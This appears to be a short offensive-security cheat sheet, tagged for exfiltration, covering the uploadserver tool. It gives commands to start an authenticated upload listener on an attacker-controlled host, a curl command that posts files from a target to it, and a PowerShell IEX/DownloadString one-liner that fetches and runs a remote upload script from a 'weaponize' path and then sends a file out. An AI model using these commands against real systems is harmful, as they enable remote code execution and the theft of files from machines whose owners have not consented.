# uploadserver
% file transfer, exfiltration, injecton

#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 

## install
```bash
pipx install uploadserver
```

## python upload HTTP server (basic auth)
sudo socat TCP-LISTEN:80,fork TCP:localhost:9090
```bash
uploadserver --basic-auth-upload <uploadserver_login>:<uploadserver_password> -b <bind_ip|127.0.0.1> <http_user_port|9090>
```

## curl upload
```bash
curl -X POST http://<local_ip>:<port|80>/lab/upload -F 'files=@<path>' -u <uploadserver_login>:<uploadserver_password>
```

## powershell upload
certutil -encode <infile> <outfile>
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<local_ip>:<port|80>/<psupload_path>PSUpload.ps1');Invoke-FileUpload -Uri http://<local_ip>:<port|80>/upload -User <uploadserver_login> -Pass <uploadserver_password> -File <path>
```

= psupload_path: windows/windows_weaponize/dev/